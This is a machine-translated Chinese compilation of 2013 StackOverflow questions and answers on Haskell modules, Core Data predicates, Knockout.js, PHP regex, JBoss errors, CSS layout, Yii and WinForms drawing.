# StackOverflow 问答 14348000-14348999

# haskell - 无法加载模块

> ID：14348004
> 
> 赞同：0
> 
> 时间：2013-01-15T22:22:14.317
> 
> 标签：haskell

我刚刚开始使用haskell .. 我尝试运行一个示例脚本：

```
import Data.List
module main where

mylength = foldr (const (+1)) 0
main = print (mylength "haskell") 
```

我收到一个简单的错误“模块已加载，没有”。我不知道为什么会这样。我在win7 32bit下使用GHCi（如果重要的话）。我在这里错过了什么吗？该示例甚至不包括“module main where”，但即使没有它，它也无法运行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:27:59.163

该`module`行总是在`import`s 之前。并且模块名称应以大写字母开头。

```
module Main where
import Data.List

mylength = foldr (const (+1)) 0
main = print (mylength "haskell") 
```

如果这对您不起作用，请告诉我们

*   您收到的完整错误消息；和
*   您正在使用哪个编译器的版本

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T22:30:33.187

你不需要`module`在那里排队。但是，当您确实将其放入时，它必须放在*任何*import 语句之前。

```
module main where  -- Optional, in the case of main.

import Data.List

myLength :: [a] -> Int
myLength = foldr (const (+1)) 0

main = print (mylength "haskell") 
```

# ios - 带有核心数据的 NSPredicate 不返回数据

> ID：14348005
> 
> 赞同：0
> 
> 时间：2013-01-15T22:22:14.300
> 
> 标签：ios, core-data, nspredicate

当以下任何一个 NSPredicate 被自己使用时，它们会按预期返回数据。但是，当我进行复合搜索时，不会返回任何内容。我的搜索有什么问题？我正在使用 NSFetchRequest 搜索核心数据

```
NSFetchRequest *request = [NSFetchRequest fetchRequestWithEntityName:@"File"];

NSPredicate *rootPredicate = [NSPredicate predicateWithFormat:@"fileWithContents.entityFolderRoot.object_id == %@", self.product.iqid];
NSPredicate *pathPredicate = [NSPredicate predicateWithFormat:@"fileWithContents.path == %@", self.currentFolder.path];

NSPredicate *predicate = [NSCompoundPredicate andPredicateWithSubpredicates:[NSArray arrayWithObjects:pathPredicate, rootPredicate, nil]];

request.predicate = rootPredicate;
[self performFetchWithRequest:request]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T01:17:18.327

查看谓词中的属性名称，您的数据结构似乎过于复杂。为什么表示文件`File`（`fileWithContents`_`path``entityFolderRoot`

确实，路径属性和文件夹根关系似乎是在描述一个类似的东西（某种容器），也许是同一个东西。这势必会导致意想不到的结果。

考虑重新设计您的数据模型。

# asp.net-mvc-4 - ASP.NET MVC4 和淘汰赛 js

> ID：14348014
> 
> 赞同：1
> 
> 时间：2013-01-15T22:22:52.463
> 
> 标签：asp.net-mvc-4, knockout.js

我正在尝试在我的项目中使用淘汰赛 js，所以我尝试了简单的 Hello World 示例，但我无法让它工作。我创建了一个新的 MVC4 项目，只需复制下面的简单绑定就是我的代码

```
<script src="~/Scripts/knockout-2.1.0.js" type="text/javascript"></script>
<script type="text/javascript">

    // Here's my data model
    var viewModel = function (first, last) {
        this.firstName = ko.observable(first);
        this.lastName = ko.observable(last);

        //this.fullName = ko.computed(function () {
            // Knockout tracks dependencies automatically. It knows that fullName depends on firstName and lastName, because these get called when evaluating fullName.
            //return this.firstName() + " " + this.lastName();
        //}, this);
    };

    $(document).ready(function() {
        ko.applyBindings(new viewModel("Planet", "Earth")); // This makes Knockout get to work
    });​
</script>

<div class="liveExample">   
    <p>First name: <input data-bind="value: firstName" /></p> 
    <p>Last name: <input data-bind="value: lastName" /></p> 
    @*<h2>Hello, <span data-bind='text: fullName'> </span>!</h2>*@  
</div> 
```

基本上它只会在文本框上显示模型的值。我已经在我的项目中引用了 knockout.js，但它不起作用我还在我的 BundleConfig.cs 中添加了 knockout js

```
bundles.Add(new ScriptBundle("~/bundles/knockout").Include("~/Scripts/knockout-2.1.0.js")); 
```

我没工作

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-16T11:54:23.403

如果您使用 MVC，请使用**脚本部分**来声明您的 JS。这会将声明移动到 HTML 页面的底部，让 HTML 先呈现。这是我第一次开箱即用的代码版本：

```
@{
    ViewBag.Title = "Index";
}

<h2>Index</h2>

<div class="liveExample">
    <p>First name:
        <input data-bind="value: firstName" /></p>
    <p>Last name:
        <input data-bind="value: lastName" /></p>
    @*<h2>Hello, <span data-bind='text: fullName'> </span>!</h2>*@
</div>

@section scripts {
    <script src="~/Scripts/knockout-2.2.1.js"></script>
    <script type="text/javascript">
    var viewModel = function (firstName, lastName) {
        this.firstName = ko.observable(firstName);
        this.lastName = ko.observable(lastName);
    };

    $(function () {
        ko.applyBindings(new viewModel("Planet", "Earth"));
    });
    </script>
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T02:30:00.040

尝试将淘汰赛放入您的文档中。没有任何错误消息，我唯一能说的是我遇到了类似的问题，这就是我的解决方法。

我的例子让我发疯，因为它在小提琴中工作但在 MVC 中不起作用，我向我的一个设计师朋友提到它，他说它是从那时起对他说的，基本上需要在页面开始渲染之前完全下载淘汰赛。

希望这可以帮助

# javascript - 谁关闭了浏览器标签？

> ID：14348015
> 
> 赞同：1
> 
> 时间：2013-01-15T22:22:52.950
> 
> 标签：javascript, html, google-chrome

我有一个（WebRTC）Web 应用程序跨三个选项卡运行：

*   选项卡 1 重置数据库（删除任何现有数据，重新创建初始数据集）
*   Tab 2 充当客户端 #1，向服务器发送异步请求
*   Tab 3 充当客户端 #2，向服务器发送异步请求

我注意到的是，如果我重新加载选项卡 1，其他一个或两个选项卡会自行关闭（如从 Chrome 的选项卡列表中删除）。我在 IRC 上询问了 Chrome 开发人员，他们坚持认为 Chrome 会打印“Aw snap！” 在选项卡崩溃的情况下，但不会将其从选项卡列表中删除。我相当确定我自己的代码没有关闭页面。

**我怎样才能弄清楚什么/谁在关闭标签？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:05:13.737

我对 Javascript 或 Chrome 不太了解，但我最近一直在做一些套接字编程，如果服务器出现故障，客户端通常会崩溃，除非他们意识到服务器断开连接并处理它（try/catch 语句） . 我的建议是确保您的客户端能够处理服务器退出它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T22:24:25.697

我觉得迟钝。

所以，在调查这个问题的几天里，我发现我的代码正在调用一个函数以防网络错误，而这个函数正在调用`close()`. 它没有解决我班级的`close()`方法，而是解决了`window.close()`。猜猜接下来发生了什么？:) 选项卡关闭。

让这个问题变得特别困难的是两个 Chrome 特有的错误：

*   [http://code.google.com/p/chromium/issues/detail?id=170757](http://code.google.com/p/chromium/issues/detail?id=170757)
*   [http://code.google.com/p/chromium/issues/detail?id=170760](http://code.google.com/p/chromium/issues/detail?id=170760)

简而言之：`window.close()`在它不应该的时候工作，而当它失败时，它会默默地这样做。

无论如何，我认为这件事已经结束。我希望这有助于其他人在未来避免犯同样的错误。

# php - 将字符串拆分为文本和数字

> ID：14348018
> 
> 赞同：5
> 
> 时间：2013-01-15T22:23:01.583
> 
> 标签：php, regex, preg-match, preg-split

我有一些可以采用以下格式的字符串

```
sometext moretext 01 文本
文本一些文本更多文本002
text text 1 (somemoretext)
ETC
```

我想将这些字符串拆分为以下内容：数字和数字之前的文本

例如： text text 1 (somemoretext)
分割时会输出：
text = text text
number = 1

数字后面的任何东西都可以丢弃

已经阅读了有关使用正则表达式的信息，并且可能使用了 preg_match 或 preg_split 但在涉及正则表达式部分时我迷路了

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-01-15T22:24:31.147

```
preg_match('/[^\d]+/', $string, $textMatch);
preg_match('/\d+/', $string, $numMatch);

$text = $textMatch[0];
$num = $numMatch[0]; 
```

* * *

或者，您可以使用`preg_match_all`捕获组一次性完成所有操作：

```
preg_match_all('/^([^\d]+)(\d+)/', $string, $match);

$text = $match[1][0];
$num = $match[2][0]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T22:26:39.447

如果您希望匹配每一行，请使用[preg_match_all() + 使用](http://php.net/manual/en/function.preg-match-all.php)[m 修饰符](http://php.net/manual/en/regexp.reference.internal-options.php)：

```
$string = 'sometext moretext 01 text
text sometext moretext 002
text text 1 (somemoretext)
etc';
preg_match_all('~^(.*?)(\d+)~m', $string, $matches); 
```

您所有的结果都在`$matches`数组中，如下所示：

```
Array
(
    [0] => Array
        (
            [0] => sometext moretext 01
            [1] => text sometext moretext 002
            [2] => text text 1
        )
    [1] => Array
        (
            [0] => sometext moretext 
            [1] => text sometext moretext 
            [2] => text text 
        )
    [2] => Array
        (
            [0] => 01
            [1] => 002
            [2] => 1
        )
) 
```

输出示例：

```
foreach ($matches[1] as $k => $text) {
    $int = $matches[2][$k];
    echo "$text => $int\n";
} 
```

# jboss - 当我在 JBoss AS 7 中使用 ActiveMQ 时出现 IllegalArgumentException

> ID：14348026
> 
> 赞同：-1
> 
> 时间：2013-01-15T22:23:28.013
> 
> 标签：jboss, activemq

在独立运行 jboss 7 后出现下一个错误。

16:09:35,699 错误 [org.jboss.msc.service]（MSC 服务线程 1-7）MSC00002：调用侦听器“org.jboss.as.connector.deployers.processors.ParsedRaDeploymentProcessor$1@20863d22”失败：java。 lang.IllegalArgumentException: JBAS014809: 节点已经在 org.jboss.as.controller.registry.ConcreteResourceRegistration.registerSubModel(ConcreteResourceRegistration.java:108) 的 '(deployment => activemq-rar-5.7.0.rar)' 处注册 [ jboss-as-controller-7.1.1.Final.jar:7.1.1.Final] 在 org.jboss.as.controller.registry.AbstractResourceRegistration.registerSubModel(AbstractResourceRegistration.java:68) [jboss-as-controller-7.1\. 1.Final.jar:7.1.1.Final] 在 org.jboss.as.controller.registry.AbstractResourceRegistration.registerOverrideModel(AbstractResourceRegistration.java:97) [jboss-as-controller-7.1.1.Final.jar:7.1\. 1.最终] 在 org.jboss.as.connector.deployers.processors.ParsedRaDeploymentProcessor$1.transition(ParsedRaDeploymentProcessor.java:181) [jboss-as-connector-7.1.1.Final.jar:7.1.1.Final] 在 org. jboss.msc.service.ServiceControllerImpl.invokeListener(ServiceControllerImpl.java:1416) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] at org.jboss.msc.service.ServiceControllerImpl.access$2700(ServiceControllerImpl .java:49) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] at org.jboss.msc.service.ServiceControllerImpl$ListenerTask.run(ServiceControllerImpl.java:1954) [jboss-msc- 1.0.2.GA.jar:1.0.2.GA] 在 java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor $Worker.run(ThreadPoolExecutor.java:908) [rt.jar:1.6.0_31] at java.lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_31]as.connector.deployers.processors.ParsedRaDeploymentProcessor$1.transition(ParsedRaDeploymentProcessor.java:181) [jboss-as-connector-7.1.1.Final.jar:7.1.1.Final] at org.jboss.msc.service.ServiceControllerImpl .invokeListener(ServiceControllerImpl.java:1416) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] at org.jboss.msc.service.ServiceControllerImpl.access$2700(ServiceControllerImpl.java:49) [jboss -msc-1.0.2.GA.jar:1.0.2.GA] 在 org.jboss.msc.service.ServiceControllerImpl$ListenerTask.run(ServiceControllerImpl.java:1954) [jboss-msc-1.0.2.GA.jar :1.0.2.GA] 在 java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor. java:908) [rt.jar:1.6.0_31] 在 java.lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_31]as.connector.deployers.processors.ParsedRaDeploymentProcessor$1.transition(ParsedRaDeploymentProcessor.java:181) [jboss-as-connector-7.1.1.Final.jar:7.1.1.Final] at org.jboss.msc.service.ServiceControllerImpl .invokeListener(ServiceControllerImpl.java:1416) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] at org.jboss.msc.service.ServiceControllerImpl.access$2700(ServiceControllerImpl.java:49) [jboss -msc-1.0.2.GA.jar:1.0.2.GA] 在 org.jboss.msc.service.ServiceControllerImpl$ListenerTask.run(ServiceControllerImpl.java:1954) [jboss-msc-1.0.2.GA.jar :1.0.2.GA] 在 java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor. java:908) [rt.jar:1.6.0_31] 在 java.lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_31]ParsedRaDeploymentProcessor$1.transition(ParsedRaDeploymentProcessor.java:181) [jboss-as-connector-7.1.1.Final.jar:7.1.1.Final] at org.jboss.msc.service.ServiceControllerImpl.invokeListener(ServiceControllerImpl.java:1416 ) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] at org.jboss.msc.service.ServiceControllerImpl.access$2700(ServiceControllerImpl.java:49) [jboss-msc-1.0.2.GA .jar:1.0.2.GA] 在 org.jboss.msc.service.ServiceControllerImpl$ListenerTask.run(ServiceControllerImpl.java:1954) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] 在java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [rt.jar :1.6.0_31] 在 java.lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_31]ParsedRaDeploymentProcessor$1.transition(ParsedRaDeploymentProcessor.java:181) [jboss-as-connector-7.1.1.Final.jar:7.1.1.Final] at org.jboss.msc.service.ServiceControllerImpl.invokeListener(ServiceControllerImpl.java:1416 ) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] at org.jboss.msc.service.ServiceControllerImpl.access$2700(ServiceControllerImpl.java:49) [jboss-msc-1.0.2.GA .jar:1.0.2.GA] 在 org.jboss.msc.service.ServiceControllerImpl$ListenerTask.run(ServiceControllerImpl.java:1954) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] 在java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [rt.jar :1.6.0_31] 在 java.lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_31]java:181) [jboss-as-connector-7.1.1.Final.jar:7.1.1.Final] 在 org.jboss.msc.service.ServiceControllerImpl.invokeListener(ServiceControllerImpl.java:1416) [jboss-msc-1.0 .2.GA.jar:1.0.2.GA] 在 org.jboss.msc.service.ServiceControllerImpl.access$2700(ServiceControllerImpl.java:49) [jboss-msc-1.0.2.GA.jar:1.0.2\. GA] 在 org.jboss.msc.service.ServiceControllerImpl$ListenerTask.run(ServiceControllerImpl.java:1954) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] 在 java.util.concurrent.ThreadPoolExecutor $Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [rt.jar:1.6.0_31] 在 java .lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_31]java:181) [jboss-as-connector-7.1.1.Final.jar:7.1.1.Final] 在 org.jboss.msc.service.ServiceControllerImpl.invokeListener(ServiceControllerImpl.java:1416) [jboss-msc-1.0 .2.GA.jar:1.0.2.GA] 在 org.jboss.msc.service.ServiceControllerImpl.access$2700(ServiceControllerImpl.java:49) [jboss-msc-1.0.2.GA.jar:1.0.2\. GA] 在 org.jboss.msc.service.ServiceControllerImpl$ListenerTask.run(ServiceControllerImpl.java:1954) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] 在 java.util.concurrent.ThreadPoolExecutor $Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [rt.jar:1.6.0_31] 在 java .lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_31]invokeListener(ServiceControllerImpl.java:1416) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] at org.jboss.msc.service.ServiceControllerImpl.access$2700(ServiceControllerImpl.java:49) [jboss- msc-1.0.2.GA.jar:1.0.2.GA] 在 org.jboss.msc.service.ServiceControllerImpl$ListenerTask.run(ServiceControllerImpl.java:1954) [jboss-msc-1.0.2.GA.jar: 1.0.2.GA] 在 java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java :908) [rt.jar:1.6.0_31] 在 java.lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_31]invokeListener(ServiceControllerImpl.java:1416) [jboss-msc-1.0.2.GA.jar:1.0.2.GA] at org.jboss.msc.service.ServiceControllerImpl.access$2700(ServiceControllerImpl.java:49) [jboss- msc-1.0.2.GA.jar:1.0.2.GA] 在 org.jboss.msc.service.ServiceControllerImpl$ListenerTask.run(ServiceControllerImpl.java:1954) [jboss-msc-1.0.2.GA.jar: 1.0.2.GA] 在 java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [rt.jar:1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java :908) [rt.jar:1.6.0_31] 在 java.lang.Thread.run(Thread.java:662) [rt.jar:1.6.0_31]运行（ServiceControllerImpl.java:1954）[jboss-msc-1.0.2.GA.jar:1.0.2.GA] 在 java.util.concurrent.ThreadPoolExecutor$Worker.runTask（ThreadPoolExecutor.java:886）[rt.jar :1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [rt.jar:1.6.0_31] 在 java.lang.Thread.run(Thread.java:662) [rt .jar:1.6.0_31]运行（ServiceControllerImpl.java:1954）[jboss-msc-1.0.2.GA.jar:1.0.2.GA] 在 java.util.concurrent.ThreadPoolExecutor$Worker.runTask（ThreadPoolExecutor.java:886）[rt.jar :1.6.0_31] 在 java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [rt.jar:1.6.0_31] 在 java.lang.Thread.run(Thread.java:662) [rt .jar:1.6.0_31]

任何人都可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-10T20:23:02.257

这是 7.1.1.Final.jar 中的一个错误。这是因为路径中有两个ironjacamar.xml 文件。我能够使用 ailed 来让它工作：Jboss AS 7.2.0.Alpha1-SNAPSHOT

# android - 上周内的日期显示星期几，否则显示日期

> ID：14348031
> 
> 赞同：0
> 
> 时间：2013-01-15T22:23:51.027
> 
> 标签：android, date

我一定是使用了错误的关键字，因为我认为这不会太难。但不知何故，我没能找到它。例如，您经常会在收到的邮件中看到上周的邮件只是说它是在星期一或星期二收到的。较早的邮件显示实际日期。

有没有人可以告诉我如何从保存的日期获得星期几以及如何检查它是否在过去 6 天内？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T23:54:34.097

您可以检查保存的日期时间和当前日期时间的差异是否小于 604800000（一周中的毫秒数）。

# css - 布局根据小部件中的帖子数量而变化

> ID：14348033
> 
> 赞同：0
> 
> 时间：2013-01-15T22:24:00.450
> 
> 标签：css, wordpress, widget, wordpress-theming

好的，所以我将尽力解释这一点。我创建了一个小部件，它将根据类别从主页上的帖子中提取特色图像。现在它吸引了 4 个帖子。我希望可以选择加入 2、3、4 或 6 个帖子。我还想根据进来的帖子数量来改变布局。是否可以只显示 2、3、4 或 6 个帖子，我将如何根据进来的帖子数量来改变布局。我在想它会为每个帖子数量或类似的东西引用css中的一个容器类。任何链接、教程或建议将不胜感激！谢谢， - 迈克尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T02:33:51.297

## 纯 CSS

这提供了一种 CSS3 方法来实现您想要的，并为 CSS2 提供了一个回退。基本上，您有一个包装器来定位您的帖子项目，这将是直接在该包装器中的唯一子项（或者，至少是特定“标签”类型的唯一子项，这里是 a `div`）。所以像下面这样，只有孩子的数量可以是 2、3、4 或 6（根据您的要求）。

**简单的 HTML**（这不一定是`div`元素；只是说明）

```
<div class="postWrapper">
  <div>This is a post</div>
  <div>This is the second post</div>
</div> 
```

**设置默认 CSS2**

对于 IE7/8，无论在这两个浏览器中显示多少帖子，这将是*默认显示，使用此选择器：*

```
.postWrapper > div { ... } 
```

**设置花式 CSS3**

这是根据帖子的数量完成的，并将显示在所有 CSS3 浏览器中。***它按以下顺序***使用这一系列选择器：（我们在这里*使用级联*来发挥我们的优势）：

```
.postWrapper > div:nth-last-of-type(2),
.postWrapper > div:nth-last-of-type(2) ~ div {
   ... your two display css ...
}

.postWrapper > div:nth-last-of-type(3),
.postWrapper > div:nth-last-of-type(3) ~ div {
   ... your three display css ...
}

.postWrapper > div:nth-last-of-type(4),
.postWrapper > div:nth-last-of-type(4) ~ div {
   ... your four display css ...
}

.postWrapper > div:nth-last-of-type(6),
.postWrapper > div:nth-last-of-type(6) ~ div {
   ... your six display css ...
} 
```

这样做是利用`:nth-last-of-type()`选择器通过包装器的子 div 的数量“倒数”，对其应用样式`div`，然后使用通用兄弟组合`~`器来设置所有其他 div 的样式`.postWrapper`（理论上）首先`div`. 它使用 对前两个执行此操作`:nth-last-of-type(2)`，但是如果包装器包含三个，则使用的下一组选择器将`:nth-last-of-type(3)`覆盖前一个`(2)`选择器，依此类推。这样，通过级联中的一系列覆盖css，我们更改了post元素数量的设置。

[**您可以在此小提琴**](http://jsfiddle.net/fS6Tz/3/)中看到此技术的示例，用于说明目的。

**注意：**因为我们使用级联来覆盖，***所以您必须确保处理任何先前设置的 css***。在我的小提琴示例中，请注意我如何将 a`margin`放在四人组上，但后来我将它移到了六人组上。如果我`margin`在第 6 组中没有提到任何内容（即没有覆盖），那么第 6 组的元素 3-6（但不是 1-2）仍然会根据之前的 4 组设置应用边距.

# php - 如何在活动记录中使用 findAllBySql 回显数据

> ID：14348034
> 
> 赞同：1
> 
> 时间：2013-01-15T22:24:04.787
> 
> 标签：php, oop, activerecord, yii

这应该返回大约五个位置的列表。它没有返回任何错误。我已经使用 mysql 工作台测试了 sql。它返回数据就好了。现在我正在编写后端，所以我不关心使用视图或数据提供者。我只是确保我的后端功能正常工作。考虑到这一点，您将如何返回 findAllBySql 检索到的数据？

```
class CashLogic
{
  public function AllLocations()
    {
        $model = new Locations;
        $allLocations = $model->findAllBySql("SELECT name from locations");
        return $allLocations; 
    }  

}

class SiteController extends Controller
{
  public function actionIndex()
    {
        $model = new CashLogic;
        $data = $model->AllLocations();
        return $data;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:50:13.940

该`findAllBySql()`方法返回一个模型数组。从您的代码看来，您只需要`names`of 位置。另一种方法是

```
 $AllLocations=CHtml::listData(Locations::model()->findAll(),'name','name'); 
```

这将返回一个形式为 的数组`array('name'=>'name','name'=>'name')`。更好的解决方案是将第一个替换为表`name`的主键`locations`。

# c# - 在透明面板后面添加图片框

> ID：14348036
> 
> 赞同：2
> 
> 时间：2013-01-15T22:24:17.217
> 
> 标签：c#, winforms, panel, picturebox

我有两个面板在彼此的顶部。下面那个比上面那个大一点。我正在使用最顶部面板上的 CreateGraphics() 方法绘制图像。（要清楚的是，这个图像是一个连接四个带有透明孔的网格）。现在我需要做的是在底部面板中添加一个图片框，并让它从这个网格后面显示出来。

我正在将图片框的控件添加到底部网格。我也在使用 BringToFront() 方法。我该怎么做才能让图片框显示在网格下方？

在下面的代码中：chipHolder 是底部面板，grid 是最顶部面板，picBox 分别是图片框

```
public void addControl()
{
   chipHolder.Controls.Add(picBox);
   picBox.BringToFront();
}

// This piece of code is in a mouse_click event of grid 
Graphics g = grid.CreateGraphics();
addControl();

// to make the picture move downwards
for (int i = 0; i < newYloc; i++)
{
     picBox.Location = new Point(newXloc, picBox.Top + 1);
     picBox.Show();
}

// drawing the grid image on the grid panel
protected virtual void grid_Paint(object sender, PaintEventArgs e)
{
     Image img = Properties.Resources.grid_fw;

     gridGraphics = grid.CreateGraphics();
     gridGraphics.DrawImage(img, 0, 0, 650, 550);
} 
```

为了获得更好的画面，这就是我的面板的样子。选择的是chipHolder面板。

![在此处输入图像描述](../Images/3a84440f6c4fa3aa86b8e07bfadcf67b.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T03:11:54.893

您可以尝试不同的方法：不要使用*Panel*并使用单个*PictureBox*，这样您就可以在该*PictureBox*中绘制所有内容。因此，您使用 PictureBox 的**MouseDown**事件处理程序来计算用户单击的（虚拟）单元格（您需要执行简单的除法），然后在*PictureBox*上绘制芯片。如果要显示芯片掉落，则需要保存当前*Bitmap*的副本（*PictureBox的**Image*属性）并在不同的**y**坐标（从 0 到其在网格上的最终位置）上绘制芯片，这就像双缓冲技术一样。

 ***这是一个小例子（你需要一个带有*PictureBox的**表单*，在这个例子中它被命名为“pictureBox2”）：

 *```
public partial class Form1 : Form
{
    Bitmap chip = new Bitmap(40, 40, PixelFormat.Format32bppArgb);

    public Form1()
    {
        InitializeComponent();
        using (Graphics g = Graphics.FromImage(chip))
        {
            g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
            g.FillEllipse(new SolidBrush(Color.FromArgb(128, 255, 80, 0)), 1, 1, 38, 38);
        }
        pictureBox2.Image = new Bitmap(pictureBox2.Width, pictureBox2.Height, PixelFormat.Format32bppArgb);
        using (Graphics g = Graphics.FromImage(pictureBox2.Image))
        {
            g.Clear(Color.Yellow);
        }
    }

    private void pictureBox2_MouseDown(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Left)
        {
            Text = e.Location.ToString();
            using (Graphics g = Graphics.FromImage(pictureBox2.Image))
            {
                g.DrawImage(chip, e.Location.X - 20, e.Location.Y - 20);
            }
            pictureBox2.Invalidate();
        }
    }
} 
```

如果您想要真正透明的控件，您应该使用**WPF**（它提供更好的图形并使用硬件加速）。****

# php - 如果选项类型为“是或否”或“对或错”，如何区分错误和正确答案

> ID：14348037
> 
> 赞同：0
> 
> 时间：2013-01-15T22:24:21.853
> 
> 标签：php

在下面的一段代码中，它显示来自 AZ 的字母列表，具体取决于`$OptionType`（例如 OptionType 是 AD，然后显示字母 ABCD）。然后它会删除正确的答案 ( `$dbAnswer`)，因此它会显示不正确的答案。

例如，正确答案是`B`。所以它显示的不正确答案是AC D。

现在这适用于字母。

`True or False`我遇到的问题是，如果选项是或，它不会从错误答案中删除正确答案`Yes or No`？例如，如果选项类型是`True or False`，如果`True`是正确的和`False`不正确的，那么它应该只显示`False`答案，而是同时显示答案`True`和`False`。`True or False`如果选项类型为或，我如何才能只拆分不正确和正确的答案`Yes or No`。

下面是代码：

```
 while ($stmt->fetch()) {

// Do this for each row:
if ( array_key_exists( $dbOptionType, $specialOptionTypes ) ) {
    $options = $specialOptionTypes[$dbOptionType];
} else if ( preg_match( '/^([A-Z])-([A-Z])$/', $dbOptionType, $match ) ) {
    $options = range( $match[1], $match[2] );
} else {
    // issue warning about unrecognized option type
    $options = array();
}
$right = str_split( $dbAnswer ); 
$wrong = array_diff( $options, $right );  

        $incorrect_ans[] = $wrong;

      } 
```

**更新：**

```
$specialOptionTypes = array('Yes or No' => array( 'Yes', 'No' ),'True or False' => array( 'True', 'False' ));

while ($stmt->fetch()) {

// Do this for each row:
if ( array_key_exists( $dbOptionType, $specialOptionTypes ) ) {
    $options = $specialOptionTypes[$dbOptionType];
} else if ( preg_match( '/^([A-Z])-([A-Z])$/', $dbOptionType, $match ) ) {
    $options = range( $match[1], $match[2] );
} else {
    // issue warning about unrecognized option type
    $options = array();
}
$right = $dbAnswer; // $right = 'True';

foreach ($options as $option) {
   // To echo out 'wrong' answers
   if ($option !== $right) {
      echo $option . '<br>';
   } 
}
$wrong = array_diff( $options, $right );  

        $incorrect_ans[] = $wrong;

      } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:29:22.407

如果您将“True”或“False”作为字符串保存在数据库中，请确保您在 PHP 中进行了正确的比较。True/False 本质上是一种不同的数据类型（布尔值而不是字符串）：

```
$right = $dbAnswer; // $right = 'True';

foreach ($options as $option) {
   // To echo out 'wrong' answers
   if ($option !== $right) {
      echo $option . '<br>';
   } 
} 
```

`==`和之间的区别在于`===`后者不仅比较值，而且比较数据类型。

* * *

```
foreach ($options as $option) {
   // To echo out 'wrong' answers
   if ($option !== $right) {
      $incorrectAnswersArray[] = $option;
   } 
}

// You now have all the incorrect answers in $incorrectAnswersArray
$firstIncorrectAnswer = $incorrectAnswersArray[0];
$secondIncorrectAnswer = $incorrectAnswersArray[1];
// etc. 
```

# google-chrome-devtools - 来自 JavaScript 的 Chrome 开发者工具

> ID：14348039
> 
> 赞同：3
> 
> 时间：2013-01-15T22:24:29.170
> 
> 标签：google-chrome-devtools

有什么方法可以访问页面上的 JavaScript 中的 Chrome 开发人员工具提供的元信息？例如元素的边界矩形，如果光标下的元素等。

谢谢回答

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-21T06:37:14.173

不，这些信息不能直接通过 JS 获得。但是，您可以使用[远程调试](https://developers.google.com/chrome-developer-tools/docs/remote-debugging)（并且[Debugger API](http://developer.chrome.com/trunk/extensions/debugger.html)可用作扩展中的传输）来获取该信息。

# ajax - Magento 1.7 - 单页结帐挂在帐单信息中，没有错误

> ID：14348041
> 
> 赞同：2
> 
> 时间：2013-01-15T22:24:41.523
> 
> 标签：ajax, magento, magento-1.7, checkout

我对此完全感到困惑-我希望有人的专业知识可以提供答案。

